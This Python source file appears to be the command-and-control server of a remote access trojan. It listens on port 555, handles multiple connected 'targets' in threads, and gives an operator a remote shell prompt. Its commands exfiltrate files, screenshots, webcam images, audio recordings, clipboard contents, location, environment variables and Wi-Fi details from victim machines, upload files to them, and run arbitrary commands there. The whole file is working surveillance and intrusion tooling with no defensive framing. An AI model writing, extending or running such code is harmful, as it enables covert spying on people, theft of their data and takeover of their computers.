import os
import socket
import json
import threading
import time

SERVER_IP = '0.0.0.0'
SERVER_PORT = 555

def reliable_send(target_sock, data):
    json_data = json.dumps(data)
    target_sock.send(json_data.encode())

def reliable_recv(target_sock):
    data = ''
    while True:
        try:
            data += target_sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def translate_command(command):
    cmd_parts = command.strip().split()
    if not cmd_parts:
        return command

    cmd = cmd_parts[0].lower()
    args = cmd_parts[1:] if len(cmd_parts) > 1 else []

    translations = {
        'ls': 'dir',
        'cd': 'cd',
        'cp': 'copy',
        'mv': 'move',
        'rm': 'del',
        'cat': 'type',
        'pwd': 'cd',
        'whoami': 'whoami',
        'mkdir': 'mkdir',
        'rmdir': 'rmdir',
        'clear': 'cls',
        'ps': 'tasklist',  # Added for process list
    }

    if cmd in translations:
        win_cmd = translations[cmd]
        if cmd == 'cd' and args:
            return f'cd /d {" ".join(args)} && cd'
        elif cmd == 'cd' and not args:
            return 'cd'
        return f'{win_cmd} {" ".join(args)}'
    return command

def target_communication(target_sock, target_ip):
    print(f"[+] Target Connected From: {target_ip}")
    while True:
        command = input(f'* Shell~{target_ip}: ').strip()
        if command == 'quit':
            reliable_send(target_sock, 'quit')
            break
        elif command == 'sysinfo':
            reliable_send(target_sock, 'sysinfo')
            result = reliable_recv(target_sock)
            print(f"System Info: {result}")
        elif command.startswith('download '):
            filename = command.split(' ', 1)[1]
            reliable_send(target_sock, f'download {filename}')
            file_data = reliable_recv(target_sock)
            if file_data.startswith("ERROR"):
                print(file_data)
            else:
                timestamp = time.strftime("%Y%m%d_%H%M%S")
                output_file = f"downloaded_{timestamp}_{filename}"
                with open(output_file, 'wb') as f:
                    f.write(bytes.fromhex(file_data))
                print(f"[+] Downloaded as {output_file}")
        elif command.startswith('upload '):
            filename = command.split(' ', 1)[1]
            try:
                with open(filename, 'rb') as f:
                    file_data = f.read().hex()
                reliable_send(target_sock, f'upload {filename} {file_data}')
                result = reliable_recv(target_sock)
                print(result)
            except FileNotFoundError:
                print(f"[-] File {filename} not found")
        elif command == 'screenshot':
            reliable_send(target_sock, 'screenshot')
            file_data = reliable_recv(target_sock)
            if file_data.startswith("ERROR"):
                print(file_data)
            else:
                timestamp = time.strftime("%Y%m%d_%H%M%S")
                output_file = f"screenshot_{timestamp}.png"
                with open(output_file, 'wb') as f:
                    f.write(bytes.fromhex(file_data))
                print(f"[+] Screenshot saved as {output_file}")
        elif command == 'webcam':
            reliable_send(target_sock, 'webcam')
            file_data = reliable_recv(target_sock)
            if file_data.startswith("ERROR"):
                print(file_data)
            else:
                timestamp = time.strftime("%Y%m%d_%H%M%S")
                output_file = f"webcam_{timestamp}_hex.txt"
                with open(output_file, 'w') as f:
                    f.write(file_data)
                print(f"[+] Webcam snapshot saved as {output_file} (convert with hex_to_png.py)")
        elif command.startswith('audio'):
            parts = command.split()
            duration = parts[1] if len(parts) > 1 else '30'
            reliable_send(target_sock, f'audio {duration}')
            file_data = reliable_recv(target_sock)
            if file_data.startswith("ERROR"):
                print(file_data)
            else:
                timestamp = time.strftime("%Y%m%d_%H%M%S")
                output_file = f"audio_{timestamp}_hex.txt"
                with open(output_file, 'w') as f:
                    f.write(file_data)
                print(f"[+] Audio recorded ({duration}s), saved as {output_file} (convert with hex_to_wav.py)")
        elif command == 'location':
            reliable_send(target_sock, 'location')
            result = reliable_recv(target_sock)
            print(f"Location: {result}")
        elif command == 'clipboard':
            reliable_send(target_sock, 'clipboard')
            result = reliable_recv(target_sock)
            print(f"Clipboard: {result}")
        elif command == 'ps':
            reliable_send(target_sock, 'ps')
            result = reliable_recv(target_sock)
            print(f"Processes:\n{result}")
        elif command == 'env':
            reliable_send(target_sock, 'env')
            result = reliable_recv(target_sock)
            print(f"Environment Variables: {result}")
        elif command == 'wifi':
            reliable_send(target_sock, 'wifi')
            result = reliable_recv(target_sock)
            print(f"Wi-Fi SSID: {result}")
        else:
            translated_cmd = translate_command(command)
            reliable_send(target_sock, translated_cmd)
            result = reliable_recv(target_sock)
            print(result)

def handle_client(target_sock, target_ip):
    try:
        target_communication(target_sock, target_ip)
    except Exception as e:
        print(f"[-] Error with {target_ip}: {e}")
    finally:
        target_sock.close()

server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_sock.bind((SERVER_IP, SERVER_PORT))
server_sock.listen(5)
print('[+] Listening For Incoming Connections')

while True:
    target_sock, target_ip = server_sock.accept()
    client_thread = threading.Thread(target=handle_client, args=(target_sock, target_ip))
    client_thread.start()
